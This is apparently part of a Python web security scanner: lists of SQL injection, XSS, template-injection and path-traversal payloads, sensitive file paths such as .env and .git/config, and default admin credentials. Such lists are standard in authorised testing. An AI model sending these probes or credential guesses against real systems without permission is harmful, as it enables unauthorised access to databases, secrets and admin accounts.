SQL_PAYLOADS = [
    "'",                          # Basic quote test
    "' OR '1'='1",               # Classic bypass
    "' OR '1'='1' --",           # Comment bypass
    "' OR 1=1--",
    "\" OR \"1\"=\"1",           # Double quote variant
    "' AND SLEEP(5)--",          # Time-based blind (MySQL)
    "'; WAITFOR DELAY '0:0:5'--",# Time-based blind (MSSQL)
    "' UNION SELECT NULL--",     # Union-based
    "' UNION SELECT NULL,NULL--",
    "1' ORDER BY 1--",           # Column count detection
]

# --- CROSS-SITE SCRIPTING ---
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "{{7*7}}",                   # Template injection test
]

# --- DIRECTORY TRAVERSAL ---
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
]

# --- SENSITIVE FILES TO PROBE ---
SENSITIVE_PATHS = [
    "/.env",
    "/.git/config",
    "/.git/HEAD",
    "/backup.zip",
    "/backup.sql",
    "/db.sql",
    "/database.sql",
    "/.DS_Store",
    "/config.php",
    "/wp-config.php",
    "/admin",
    "/administrator",
    "/phpmyadmin",
    "/wp-admin",
    "/server-status",
    "/server-info",
    "/actuator",
    "/actuator/env",
    "/api/swagger.json",
    "/swagger.json",
    "/robots.txt",
    "/sitemap.xml",
    "/crossdomain.xml",
    "/.htaccess",
    "/web.config",
    "/error_log",
    "/access_log",
]

# --- COMMON WEAK PASSWORDS ---
WEAK_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("root", "root"),
    ("test", "test"),
    ("guest", "guest"),
]